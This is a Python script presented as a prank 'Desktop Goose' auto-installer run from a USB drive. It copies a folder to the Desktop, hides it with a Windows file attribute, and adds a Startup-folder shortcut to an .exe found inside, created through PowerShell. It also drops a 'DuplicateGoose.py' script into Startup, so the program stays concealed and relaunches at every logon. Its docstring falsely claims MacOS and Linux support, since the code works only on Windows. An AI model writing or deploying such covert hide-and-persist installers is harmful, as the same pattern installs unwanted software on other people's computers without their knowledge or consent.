"""
Desktop Goose Auto-installer
hehehehe
Can install Desktop Goose on Windows, MacOS, and Linux from a usb drive.
"""

import os
import sys
import shutil
import subprocess
from pathlib import Path
import ctypes

def copy_folder(source_folder, destination_folder):
    """Copy a folder to the specified directory."""
    try:
        shutil.copytree(source_folder, destination_folder, dirs_exist_ok=False)
        print(f"✓ Copied {source_folder} to {destination_folder}")
        return True
    except FileExistsError:
        print(f"✗ Destination already exists: {destination_folder}")
        return False
    except FileNotFoundError:
        print(f"✗ Source folder not found: {source_folder}")
        return False
    except Exception as e:
        print(f"✗ Error copying folder: {e}")
        return False

def hide_folder(folder_path):
    """Hide a folder on Windows by setting the hidden attribute."""
    try:
        # Set hidden attribute on Windows
        ctypes.windll.kernel32.SetFileAttributesW(str(folder_path), 2)
        print(f"✓ Folder hidden: {folder_path}")
        return True
    except Exception as e:
        print(f"✗ Failed to hide folder: {e}")
        return False

def find_exe_file(folder_path):
    """Find the first .exe file in the folder."""
    try:
        for file in Path(folder_path).rglob('*.exe'):
            return str(file)
        print(f"✗ No .exe file found in {folder_path}")
        return None
    except Exception as e:
        print(f"✗ Error searching for exe: {e}")
        return None

def create_startup_shortcut(exe_path, shortcut_name=None):
    """Create a Windows shortcut to the exe in the startup folder."""
    try:
        if shortcut_name is None:
            shortcut_name = Path(exe_path).stem
        
        # Get startup folder path
        startup_folder = Path.home() / "AppData" / "Roaming" / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
        
        if not startup_folder.exists():
            print(f"✗ Startup folder not found: {startup_folder}")
            return False
        
        shortcut_path = startup_folder / f"{shortcut_name}.lnk"
        
        # Create shortcut using PowerShell
        powershell_command = f"""
        $WshShell = New-Object -ComObject WScript.Shell
        $Shortcut = $WshShell.CreateShortcut('{shortcut_path}')
        $Shortcut.TargetPath = '{exe_path}'
        $Shortcut.WorkingDirectory = '{Path(exe_path).parent}'
        $Shortcut.Save()
        """
        
        subprocess.run(
            ["powershell", "-Command", powershell_command],
            check=True,
            capture_output=True
        )
        
        print(f"✓ Shortcut created: {shortcut_path}")
        return True
    except Exception as e:
        print(f"✗ Failed to create shortcut: {e}")
        return False

def copy_python_script_to_startup(script_name):
    """Copy a Python script from the script directory to the startup folder."""
    try:
        # Get the directory where the script is located
        script_dir = Path(__file__).parent
        source_script = script_dir / script_name
        
        if not source_script.exists():
            print(f"✗ Script not found: {source_script}")
            return False
        
        # Get startup folder path
        startup_folder = Path.home() / "AppData" / "Roaming" / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
        
        if not startup_folder.exists():
            print(f"✗ Startup folder not found: {startup_folder}")
            return False
        
        destination_script = startup_folder / script_name
        
        # Copy the script
        shutil.copy2(source_script, destination_script)
        print(f"✓ Script copied to startup: {destination_script}")
        return True
    except Exception as e:
        print(f"✗ Failed to copy script to startup: {e}")
        return False

def main():
    """Main installation function."""
    print("=" * 50)
    print("Desktop Goose Auto-installer")
    print("=" * 50)
    
    # Get the directory where the script is located
    script_dir = Path(__file__).parent
    
    # Find folders in the current directory (excluding common system/Python folders)
    exclude_dirs = {'.git', '__pycache__', '.venv', 'venv', 'env', '.eggs', '*.egg-info'}
    folders = [f for f in script_dir.iterdir() 
               if f.is_dir() and f.name not in exclude_dirs and not f.name.startswith('.')]
    
    if not folders:
        print("✗ No folder found in the script directory")
        return False
    
    source_folder = folders[0]
    print(f"\nFound folder: {source_folder.name}")
    
    # Set destination directory to Desktop
    desktop_path = Path.home() / "Desktop"
    destination_folder = desktop_path / source_folder.name
    
    # Step 1: Copy folder
    print("\n[1/4] Copying folder to Desktop...")
    if not copy_folder(str(source_folder), str(destination_folder)):
        return False
    
    # Step 2: Hide the folder
    print("\n[2/4] Hiding folder...")
    if not hide_folder(destination_folder):
        print("⚠ Warning: Could not hide folder, but continuing...")
    
    # Step 3: Find exe and create startup shortcut
    print("\n[3/4] Creating startup shortcut for exe...")
    exe_path = find_exe_file(destination_folder)
    
    if not exe_path:
        return False
    
    if not create_startup_shortcut(exe_path):
        return False
    
    # Step 4: Copy DuplicateGoose.py to startup folder
    print("\n[4/4] Copying DuplicateGoose.py to startup...")
    if not copy_python_script_to_startup("DuplicateGoose.py"):
        print("⚠ Warning: Could not copy DuplicateGoose.py, but installation otherwise complete")
    
    print("\n" + "=" * 50)
    print("✓ Installation completed successfully!")
    print("=" * 50)
    return True

if __name__ == "__main__":
    success = main()
    sys.exit(0 if success else 1)
